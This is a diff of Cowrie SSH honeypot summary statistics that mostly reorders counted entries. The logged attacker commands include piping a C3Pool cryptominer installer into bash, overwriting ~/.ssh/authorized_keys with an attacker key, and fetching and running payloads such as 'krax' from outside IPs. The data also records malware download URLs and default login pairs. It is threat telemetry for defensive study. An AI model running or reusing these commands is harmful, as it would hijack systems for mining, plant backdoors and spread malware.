-      "input": "cat /etc/issue; curl -s -L https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/setup_c3pool_miner.sh | bash -s 45PhrYw8ktzFEEXgfyuQDcEVQNeQQ9ANQ7xB6eUzXJ3D6QqK7TeBTh5AdqxRGZpUtqFLayFiirg8Nj9djgKaMMAVE48GAWX",
+      "input": "curl: option -L not recognized\ncurl: try 'curl --help' or 'curl --manual' for more information\n",
       "count": 13
     },
     {
-      "input": "curl: option -L not recognized\ncurl: try 'curl --help' or 'curl --manual' for more information\n",
+      "input": "cat /etc/issue; curl -s -L https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/setup_c3pool_miner.sh | bash -s 45PhrYw8ktzFEEXgfyuQDcEVQNeQQ9ANQ7xB6eUzXJ3D6QqK7TeBTh5AdqxRGZpUtqFLayFiirg8Nj9djgKaMMAVE48GAWX",
       "count": 13
     },
     {
@@ -4377,11 +4377,11 @@
       "count": 13
     },
     {
-      "input": "scp -t /var/tmp/clamav.pl",
+      "input": "perl /var/tmp/clamav.pl;rm -rf /var/tmp/clamav.pl",
       "count": 7
     },
     {
-      "input": "perl /var/tmp/clamav.pl;rm -rf /var/tmp/clamav.pl",
+      "input": "scp -t /var/tmp/clamav.pl",
       "count": 7
     }
   ],
@@ -4508,19 +4508,19 @@
       "count": 601
     },
     {
-      "input": "cat /proc/cpuinfo | grep name | wc -l",
-      "count": 596
-    },
-    {
       "input": "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
       "count": 596
     },
     {
-      "input": "uname",
-      "count": 595
+      "input": "cat /proc/cpuinfo | grep name | wc -l",
+      "count": 596
     },
     {
       "input": "lscpu | grep Model",
+      "count": 595
+    },
+    {
+      "input": "uname",
       "count": 595
     }
   ],
@@ -4585,12 +4585,12 @@
       "count": 613
     },
     {
-      "src_ip": "5.188.86.210",
+      "src_ip": "5.188.86.207",
       "robot": true,
       "count": 471
     },
     {
-      "src_ip": "5.188.86.207",
+      "src_ip": "5.188.86.210",
       "robot": true,
       "count": 471
     },
@@ -4603,16 +4603,16 @@
   "file_download": [
     {
       "url": null,
-      "outfile": "var/lib/cowrie/downloads/0ff03fb4ae41644a61ec290214aa626aebab2b6ef40d4f0552c87fbb056d97bf",
+      "outfile": "var/lib/cowrie/downloads/5b02824f0e533d5c172ae151b4988fcc55521d9922142d01795d6d641add073d",
       "scans": {
-        "positives": null,
-        "total": null
+        "positives": 0,
+        "total": 58
       },
       "count": 1
     },
     {
       "url": null,
-      "outfile": "var/lib/cowrie/downloads/a2f2d4877119be9c99613b8c42799e561bcb529cf1cc36bd018a4654f069a1a8",
+      "outfile": "var/lib/cowrie/downloads/bea9d004b94b98da48146e249c5609fee8a5580a2ab76286b8c9038305d4a0ad",
       "scans": {
         "positives": null,
         "total": null
@@ -4630,7 +4630,7 @@
     },
     {
       "url": null,
-      "outfile": "var/lib/cowrie/downloads/bea9d004b94b98da48146e249c5609fee8a5580a2ab76286b8c9038305d4a0ad",
+      "outfile": "var/lib/cowrie/downloads/a2f2d4877119be9c99613b8c42799e561bcb529cf1cc36bd018a4654f069a1a8",
       "scans": {
         "positives": null,
         "total": null
@@ -4639,10 +4639,10 @@
     },
     {
       "url": null,
-      "outfile": "var/lib/cowrie/downloads/5b02824f0e533d5c172ae151b4988fcc55521d9922142d01795d6d641add073d",
+      "outfile": "var/lib/cowrie/downloads/0ff03fb4ae41644a61ec290214aa626aebab2b6ef40d4f0552c87fbb056d97bf",
       "scans": {
-        "positives": 0,
-        "total": 58
+        "positives": null,
+        "total": null
       },
       "count": 1
     }
@@ -4722,19 +4722,19 @@
       "count": 609
     },
     {
-      "input": "cat /proc/cpuinfo | grep name | wc -l",
-      "count": 604
-    },
-    {
       "input": "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
       "count": 604
     },
     {
-      "input": "lscpu | grep Model",
-      "count": 603
+      "input": "cat /proc/cpuinfo | grep name | wc -l",
+      "count": 604
     },
     {
       "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+      "count": 603
+    },
+    {
+      "input": "lscpu | grep Model",
       "count": 603
     }
   ],
@@ -4879,15 +4879,7 @@
   ],
   "commands": [
     {
-      "input": "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
-      "count": 100
-    },
-    {
-      "input": "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
-      "count": 100
-    },
-    {
-      "input": "ls -lh $(which ls)",
+      "input": "uname -a",
       "count": 100
     },
     {
@@ -4895,7 +4887,15 @@
       "count": 100
     },
     {
-      "input": "uname -a",
+      "input": "ls -lh $(which ls)",
+      "count": 100
+    },
+    {
+      "input": "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
+      "count": 100
+    },
+    {
+      "input": "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
       "count": 100
     }
   ],
@@ -5040,11 +5040,11 @@
   ],
   "commands": [
     {
-      "input": "uname",
+      "input": "uname -a",
       "count": 292
     },
     {
-      "input": "uname -a",
+      "input": "uname",
       "count": 292
     },
     {
@@ -5052,11 +5052,11 @@
       "count": 287
     },
     {
-      "input": "ls -lh $(which ls)",
+      "input": "which ls",
       "count": 286
     },
     {
-      "input": "which ls",
+      "input": "ls -lh $(which ls)",
       "count": 286
     }
   ],
@@ -5138,11 +5138,20 @@
   ],
   "file_download": [
     {
+      "url": "http://45.133.9.32/x86_64",
+      "outfile": "var/lib/cowrie/downloads/af7a110b9654e30994c3f5ff1f79444adfe606f89f3685989e419acdd261321d",
+      "scans": {
+        "positives": 40,
+        "total": 62
+      },
+      "count": 1
+    },
+    {
       "url": null,
-      "outfile": "var/lib/cowrie/downloads/9277da6f0511dbcd21e4b9705350c21a02478c95891129e7560252b594a8a81e",
+      "outfile": "var/lib/cowrie/downloads/fb68f85e6c34fac429408f1ae0dbf85c6c905621e28ec3c525ad7fa408a66b04",
       "scans": {
         "positives": 0,
-        "total": 58
+        "total": 54
       },
       "count": 1
     },
@@ -5157,19 +5166,10 @@
     },
     {
       "url": null,
-      "outfile": "var/lib/cowrie/downloads/fb68f85e6c34fac429408f1ae0dbf85c6c905621e28ec3c525ad7fa408a66b04",
+      "outfile": "var/lib/cowrie/downloads/9277da6f0511dbcd21e4b9705350c21a02478c95891129e7560252b594a8a81e",
       "scans": {
         "positives": 0,
-        "total": 54
-      },
-      "count": 1
-    },
-    {
-      "url": "http://45.133.9.32/x86_64",
-      "outfile": "var/lib/cowrie/downloads/af7a110b9654e30994c3f5ff1f79444adfe606f89f3685989e419acdd261321d",
-      "scans": {
-        "positives": 40,
-        "total": 62
+        "total": 58
       },
       "count": 1
     }
@@ -5233,27 +5233,19 @@
       "count": 26
     },
     {
-      "username": "mos",
-      "password": "mos",
+      "username": "minerstat",
+      "password": "msos",
       "count": 6
     },
     {
-      "username": "minerstat",
-      "password": "msos",
+      "username": "mos",
+      "password": "mos",
       "count": 6
     }
   ],
   "commands": [
     {
-      "input": "top",
-      "count": 98
-    },
-    {
-      "input": "uname",
-      "count": 98
-    },
-    {
-      "input": "uname -a",
+      "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
       "count": 98
     },
     {
@@ -5261,7 +5253,15 @@
       "count": 98
     },
     {
-      "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+      "input": "uname -a",
+      "count": 98
+    },
+    {
+      "input": "uname",
+      "count": 98
+    },
+    {
+      "input": "top",
       "count": 98
     }
   ],
@@ -5406,15 +5406,7 @@
   ],
   "commands": [
     {
-      "input": "which ls",
-      "count": 156
-    },
-    {
-      "input": "crontab -l",
-      "count": 156
-    },
-    {
-      "input": "w",
+      "input": "cat /proc/cpuinfo | grep model | grep name | wc -l",
       "count": 156
     },
     {
@@ -5422,7 +5414,15 @@
       "count": 156
     },
     {
-      "input": "cat /proc/cpuinfo | grep model | grep name | wc -l",
+      "input": "w",
+      "count": 156
+    },
+    {
+      "input": "crontab -l",
+      "count": 156
+    },
+    {
+      "input": "which ls",
       "count": 156
     }
   ],
@@ -5575,11 +5575,11 @@
       "count": 207
     },
     {
-      "input": "crontab -l",
+      "input": "w",
       "count": 206
     },
     {
-      "input": "w",
+      "input": "crontab -l",
       "count": 206
     }
   ],
@@ -5597,11 +5597,11 @@
       "count": 7
     },
     {
-      "input": "curl: option -L not recognized\ncurl: try 'curl --help' or 'curl --manual' for more information\n",
+      "input": "uname -s -v -n -r",
       "count": 6
     },
     {
-      "input": "uname -s -v -n -r",
+      "input": "curl: option -L not recognized\ncurl: try 'curl --help' or 'curl --manual' for more information\n",
       "count": 6
     }
   ],
@@ -5661,19 +5661,19 @@
   ],
   "file_download": [
     {
-      "url": "http://103.219.152.125/manager.sh",
-      "outfile": "var/lib/cowrie/downloads/6cb36da323e12faf7919947d8fdf7cf5516b72b04aa1067c3bb9264830f48bfc",
+      "url": null,
+      "outfile": "var/lib/cowrie/downloads/f21b755fc5706dc466fa7236eb9b6aa4a3c02951ba94d917cf195cb196602cf7",
       "scans": {
-        "positives": 3,
+        "positives": 0,
         "total": 59
       },
       "count": 1
     },
     {
-      "url": null,
-      "outfile": "var/lib/cowrie/downloads/f21b755fc5706dc466fa7236eb9b6aa4a3c02951ba94d917cf195cb196602cf7",
+      "url": "http://103.219.152.125/manager.sh",
+      "outfile": "var/lib/cowrie/downloads/6cb36da323e12faf7919947d8fdf7cf5516b72b04aa1067c3bb9264830f48bfc",
       "scans": {
-        "positives": 0,
+        "positives": 3,
         "total": 59
       },
       "count": 1
@@ -5754,11 +5754,7 @@
       "count": 64
     },
     {
-      "input": "cat /proc/cpuinfo | grep model | grep name | wc -l",
-      "count": 63
-    },
-    {
-      "input": "top",
+      "input": "lscpu | grep Model",
       "count": 63
     },
     {
@@ -5766,7 +5762,11 @@
       "count": 63
     },
     {
-      "input": "lscpu | grep Model",
+      "input": "top",
+      "count": 63
+    },
+    {
+      "input": "cat /proc/cpuinfo | grep model | grep name | wc -l",
       "count": 63
     }
   ],
@@ -5784,11 +5784,11 @@
       "count": 3
     },
     {
-      "input": "curl -s -L https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/setup_c3pool_miner.sh | bash -s 4ANkemPGmjeLPgLfyYupu2B8Hed2dy8i6XYF7ehqRsSfbvZM2Pz7bDeaZXVQAs533a7MUnhB6pUREVDj2LgWj1AQSGo2HRj; echo D-141",
+      "input": "curl: option -L not recognized\ncurl: try 'curl --help' or 'curl --manual' for more information\n",
       "count": 2
     },
     {
-      "input": "curl: option -L not recognized\ncurl: try 'curl --help' or 'curl --manual' for more information\n",
+      "input": "curl -s -L https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/setup_c3pool_miner.sh | bash -s 4ANkemPGmjeLPgLfyYupu2B8Hed2dy8i6XYF7ehqRsSfbvZM2Pz7bDeaZXVQAs533a7MUnhB6pUREVDj2LgWj1AQSGo2HRj; echo D-141",
       "count": 2
     }
   ],
@@ -5936,7 +5936,7 @@
       "count": 287
     },
     {
-      "input": "top",
+      "input": "lscpu | grep Model",
       "count": 281
     },
     {
@@ -5944,7 +5944,7 @@
       "count": 281
     },
     {
-      "input": "lscpu | grep Model",
+      "input": "top",
       "count": 281
     }
   ],
@@ -6101,11 +6101,11 @@
       "count": 86
     },
     {
-      "input": "lscpu | grep Model",
+      "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
       "count": 85
     },
     {
-      "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+      "input": "lscpu | grep Model",
       "count": 85
     }
   ],
@@ -6254,19 +6254,19 @@
       "count": 222
     },
     {
-      "input": "cat /proc/cpuinfo | grep name | wc -l",
-      "count": 219
-    },
-    {
       "input": "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
       "count": 219
     },
     {
-      "input": "lscpu | grep Model",
-      "count": 218
+      "input": "cat /proc/cpuinfo | grep name | wc -l",
+      "count": 219
     },
     {
       "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+      "count": 218
+    },
+    {
+      "input": "lscpu | grep Model",
       "count": 218
     }
   ],
@@ -6284,11 +6284,11 @@
       "count": 2
     },
     {
-      "input": "cd /dev/shm || cd /tmp || cd /var/run || cd /mnt; wget 198.98.56.65/krax || curl -o krax 198.98.56.65/krax; tar xvf krax; cd ._lul; chmod +x *; ./krn; ./krane 1",
+      "input": "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
       "count": 1
     },
     {
-      "input": "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
+      "input": "cd /dev/shm || cd /tmp || cd /var/run || cd /mnt; wget 198.98.56.65/krax || curl -o krax 198.98.56.65/krax; tar xvf krax; cd ._lul; chmod +x *; ./krn; ./krane 1",
       "count": 1
     }
   ],
@@ -6419,7 +6419,7 @@
       "count": 572
     },
     {
-      "input": "crontab -l",
+      "input": "uname -m",
       "count": 569
     },
     {
@@ -6427,7 +6427,7 @@
       "count": 569
     },
     {
-      "input": "uname -m",
+      "input": "crontab -l",
       "count": 569
     }
   ],
@@ -6510,19 +6510,10 @@
   "file_download": [
     {
       "url": null,
-      "outfile": "var/lib/cowrie/downloads/ad08fe6db725efd104dbff2b52bb760e38c4d3b500d80aa93b7635ab0c0c5204",
+      "outfile": "var/lib/cowrie/downloads/6736ddd81c5a9575f5df919b830d97be16fcc742a82d23ddff39e942b783e2c3",
       "scans": {
-        "positives": 0,
-        "total": 58
-      },
-      "count": 1
-    },
-    {
-      "url": null,
-      "outfile": "var/lib/cowrie/downloads/cc0a8ed5cc481bb8d21e6869c04e67f9569d80a8cf88e140cad7a5b7cfab6a36",
-      "scans": {
-        "positives": 0,
-        "total": 58
+        "positives": null,
+        "total": null
       },
       "count": 1
     },
@@ -6537,10 +6528,19 @@
     },
     {
       "url": null,
-      "outfile": "var/lib/cowrie/downloads/6736ddd81c5a9575f5df919b830d97be16fcc742a82d23ddff39e942b783e2c3",
+      "outfile": "var/lib/cowrie/downloads/cc0a8ed5cc481bb8d21e6869c04e67f9569d80a8cf88e140cad7a5b7cfab6a36",
       "scans": {
-        "positives": null,
-        "total": null
+        "positives": 0,
+        "total": 58
+      },
+      "count": 1
+    },
+    {
+      "url": null,
+      "outfile": "var/lib/cowrie/downloads/ad08fe6db725efd104dbff2b52bb760e38c4d3b500d80aa93b7635ab0c0c5204",
+      "scans": {
+        "positives": 0,
+        "total": 58
       },
       "count": 1
     }
@@ -6620,19 +6620,19 @@
       "count": 1300
     },
     {
-      "input": "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
-      "count": 1299
-    },
-    {
       "input": "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
       "count": 1299
     },
     {
-      "input": "crontab -l",
-      "count": 1298
+      "input": "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
+      "count": 1299
     },
     {
       "input": "w",
+      "count": 1298
+    },
+    {
+      "input": "crontab -l",
       "count": 1298
     }
   ],
@@ -6650,11 +6650,11 @@
       "count": 2
     },
     {
-      "input": "uname",
+      "input": "lscpu | grep Model",
       "count": 1
     },
     {
-      "input": "lscpu | grep Model",
+      "input": "uname",
       "count": 1
     }
   ],
@@ -6777,19 +6777,19 @@
   ],
   "commands": [
     {
-      "input": "cat /proc/cpuinfo | grep name | wc -l",
-      "count": 611
-    },
-    {
       "input": "uname -a",
       "count": 611
     },
     {
-      "input": "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
-      "count": 610
+      "input": "cat /proc/cpuinfo | grep name | wc -l",
+      "count": 611
     },
     {
       "input": "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
+      "count": 610
+    },
+    {
+      "input": "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
       "count": 610
     },
     {
@@ -6807,7 +6807,7 @@
       "count": 11
     },
     {
-      "input": "cd /var/run ; rm -rf tsh ; tftp -g 127.0.0.1 -r tsh ; sh tsh &",
+      "input": "cd /dev/shm || cd /tmp || cd /var/run || cd /mnt; wget 198.98.56.65/krax || curl -o krax 198.98.56.65/krax; tar xvf krax; cd ._lul; chmod +x *; ./krn; ./krane Oracle123",
       "count": 1
     },
     {
@@ -6815,7 +6815,7 @@
       "count": 1
     },
     {
-      "input": "cd /dev/shm || cd /tmp || cd /var/run || cd /mnt; wget 198.98.56.65/krax || curl -o krax 198.98.56.65/krax; tar xvf krax; cd ._lul; chmod +x *; ./krn; ./krane Oracle123",
+      "input": "cd /var/run ; rm -rf tsh ; tftp -g 127.0.0.1 -r tsh ; sh tsh &",
       "count": 1
     }
   ],
@@ -6858,12 +6858,12 @@
       "count": 452
     },
     {
-      "src_ip": "5.188.86.216",
+      "src_ip": "5.188.86.210",
       "robot": true,
       "count": 451
     },
     {
-      "src_ip": "5.188.86.210",
+      "src_ip": "5.188.86.216",
       "robot": true,
       "count": 451
     },
@@ -6875,20 +6875,20 @@
   ],
   "file_download": [
     {
-      "url": null,
-      "outfile": "var/lib/cowrie/downloads/5ad4b59b0b1e3e53c1495d874865d7ca1afccb3edb2c3081908834ce78632141",
+      "url": "http://198.98.56.65/krax",
+      "outfile": "var/lib/cowrie/downloads/37467f83f3190d3f43b5786783e39a9125683a3c30beed4477387e4bf3bbffa7",
       "scans": {
-        "positives": null,
-        "total": null
+        "positives": 23,
+        "total": 60
       },
       "count": 1
     },
     {
       "url": null,
-      "outfile": "var/lib/cowrie/downloads/e704e9b9b37820742b2e4f802ba570dc0e0a8c3be5fbb4ee61f5d71b14ac518c",
+      "outfile": "var/lib/cowrie/downloads/b548a629ba38742b73ad24598efc84251d2137677ae02b366f0dfa5df3b7372f",
       "scans": {
-        "positives": 0,
-        "total": 56
+        "positives": null,
+        "total": null
       },
       "count": 1
     },
@@ -6903,19 +6903,19 @@
     },
     {
       "url": null,
-      "outfile": "var/lib/cowrie/downloads/b548a629ba38742b73ad24598efc84251d2137677ae02b366f0dfa5df3b7372f",
+      "outfile": "var/lib/cowrie/downloads/e704e9b9b37820742b2e4f802ba570dc0e0a8c3be5fbb4ee61f5d71b14ac518c",
       "scans": {
-        "positives": null,
-        "total": null
+        "positives": 0,
+        "total": 56
       },
       "count": 1
     },
     {
-      "url": "http://198.98.56.65/krax",
-      "outfile": "var/lib/cowrie/downloads/37467f83f3190d3f43b5786783e39a9125683a3c30beed4477387e4bf3bbffa7",
+      "url": null,
+      "outfile": "var/lib/cowrie/downloads/5ad4b59b0b1e3e53c1495d874865d7ca1afccb3edb2c3081908834ce78632141",
       "scans": {
-        "positives": 23,
-        "total": 60
+        "positives": null,
+        "total": null
       },
       "count": 1
     }
@@ -6999,11 +6999,7 @@
       "count": 691
     },
     {
-      "input": "ls -lh $(which ls)",
-      "count": 690
-    },
-    {
-      "input": "which ls",
+      "input": "w",
       "count": 690
     },
     {
@@ -7011,7 +7007,11 @@
       "count": 690
     },
     {
-      "input": "w",
+      "input": "which ls",
+      "count": 690
+    },
+    {
+      "input": "ls -lh $(which ls)",
       "count": 690
     }
   ],
@@ -7021,19 +7021,19 @@
       "count": 686
     },
     {
-      "input": "echo Hi | cat -n",
-      "count": 2
-    },
-    {
       "input": "w",
       "count": 2
     },
     {
-      "input": "lscpu | grep Model",
-      "count": 1
+      "input": "echo Hi | cat -n",
+      "count": 2
     },
     {
       "input": "uname -a",
+      "count": 1
+    },
+    {
+      "input": "lscpu | grep Model",
       "count": 1
     }
   ],
@@ -7162,15 +7162,7 @@
   ],
   "commands": [
     {
-      "input": "which ls",
-      "count": 232
-    },
-    {
-      "input": "crontab -l",
-      "count": 232
-    },
-    {
-      "input": "w",
+      "input": "uname",
       "count": 232
     },
     {
@@ -7178,7 +7170,15 @@
       "count": 232
     },
     {
-      "input": "uname",
+      "input": "w",
+      "count": 232
+    },
+    {
+      "input": "crontab -l",
+      "count": 232
+    },
+    {
+      "input": "which ls",
       "count": 232
     }
   ],
@@ -7270,30 +7270,30 @@
     },
     {
       "url": null,
-      "outfile": "var/lib/cowrie/downloads/f15228d58bf9ebdf955a2c5532575e9a9810f373d77cd76768c4986056bb9853",
-      "scans": {
-        "positives": 0,
-        "total": 59
-      },
-      "count": 1
-    },
-    {
-      "url": null,
       "outfile": "var/lib/cowrie/downloads/ea03e544762368cd69728799a4a4f504b79c30a9708ad4e33a7cac437def37b7",
       "scans": {
         "positives": 0,
         "total": 57
       },
       "count": 1
+    },
+    {
+      "url": null,
+      "outfile": "var/lib/cowrie/downloads/f15228d58bf9ebdf955a2c5532575e9a9810f373d77cd76768c4986056bb9853",
+      "scans": {
+        "positives": 0,
+        "total": 59
+      },
+      "count": 1
     }
   ],
   "file_upload": [
     {
-      "filename": "dota.tar.gz",
+      "filename": "dota3.tar.gz",
       "count": 1
     },
     {
-      "filename": "dota3.tar.gz",
+      "filename": "dota.tar.gz",
       "count": 1
     }
   ],
@@ -7374,11 +7374,11 @@
       "count": 315
     },
     {
-      "input": "uname -m",
+      "input": "cat /proc/cpuinfo | grep model | grep name | wc -l",
       "count": 314
     },
     {
-      "input": "cat /proc/cpuinfo | grep model | grep name | wc -l",
+      "input": "uname -m",
       "count": 314
     }
   ],
@@ -7546,11 +7546,11 @@
       "count": 323
     },
     {
-      "input": "crontab -l",
+      "input": "w",
       "count": 322
     },
     {
-      "input": "w",
+      "input": "crontab -l",
       "count": 322
     }
   ],
@@ -7568,11 +7568,11 @@
       "count": 10
     },
     {
-      "input": "scp -t /var/tmp/clamav.pl",
+      "input": "perl /var/tmp/clamav.pl;rm -rf /var/tmp/clamav.pl",
       "count": 7
     },
     {
-      "input": "perl /var/tmp/clamav.pl;rm -rf /var/tmp/clamav.pl",
+      "input": "scp -t /var/tmp/clamav.pl",
       "count": 7
     }
   ],
@@ -7633,28 +7633,10 @@
   "file_download": [
     {
       "url": null,
-      "outfile": "var/lib/cowrie/downloads/acab01738bb47235e7fc6b5e962cd606c6b309628d8e9a643daad24e87cc583a",
+      "outfile": "var/lib/cowrie/downloads/428669859bb1532c4fe6026c7d4d5e70b838bceadf5c550788526a8272d7553a",
       "scans": {
         "positives": 0,
         "total": 58
-      },
-      "count": 1
-    },
-    {
-      "url": null,
-      "outfile": "var/lib/cowrie/downloads/4b70ad96dc986220e28862b5cb602ef5dfb356f08731be7c6df5e742dc4e3ffd",
-      "scans": {
-        "positives": 0,
-        "total": 56
-      },
-      "count": 1
-    },
-    {
-      "url": null,
-      "outfile": "var/lib/cowrie/downloads/bdb155fcdfc3746553f0b4e55d7263b2b851acbfc8c643ed2e5d68b256477b0c",
-      "scans": {
-        "positives": 0,
-        "total": 57
       },
       "count": 1
     },
@@ -7669,7 +7651,25 @@
     },
     {
       "url": null,
-      "outfile": "var/lib/cowrie/downloads/428669859bb1532c4fe6026c7d4d5e70b838bceadf5c550788526a8272d7553a",
+      "outfile": "var/lib/cowrie/downloads/bdb155fcdfc3746553f0b4e55d7263b2b851acbfc8c643ed2e5d68b256477b0c",
+      "scans": {
+        "positives": 0,
+        "total": 57
+      },
+      "count": 1
+    },
+    {
+      "url": null,
+      "outfile": "var/lib/cowrie/downloads/4b70ad96dc986220e28862b5cb602ef5dfb356f08731be7c6df5e742dc4e3ffd",
+      "scans": {
+        "positives": 0,
+        "total": 56
+      },
+      "count": 1
+    },
+    {
+      "url": null,
+      "outfile": "var/lib/cowrie/downloads/acab01738bb47235e7fc6b5e962cd606c6b309628d8e9a643daad24e87cc583a",
       "scans": {
         "positives": 0,
         "total": 58
@@ -7736,27 +7736,27 @@
       "count": 7
     },
     {
-      "username": "user",
-      "password": "password",
+      "username": "pi",
+      "password": "raspberry",
       "count": 6
     },
     {
-      "username": "pi",
-      "password": "raspberry",
+      "username": "user",
+      "password": "password",
       "count": 6
     }
   ],
   "commands": [
     {
-      "input": "cat /proc/cpuinfo | grep name | wc -l",
-      "count": 287
-    },
-    {
       "input": "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
       "count": 287
     },
     {
-      "input": "uname",
+      "input": "cat /proc/cpuinfo | grep name | wc -l",
+      "count": 287
+    },
+    {
+      "input": "lscpu | grep Model",
       "count": 286
     },
     {
@@ -7764,7 +7764,7 @@
       "count": 286
     },
     {
-      "input": "lscpu | grep Model",
+      "input": "uname",
       "count": 286
     }
   ],
@@ -7778,11 +7778,11 @@
       "count": 3
     },
     {
-      "input": "lscpu | grep Model",
+      "input": "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
       "count": 1
     },
     {
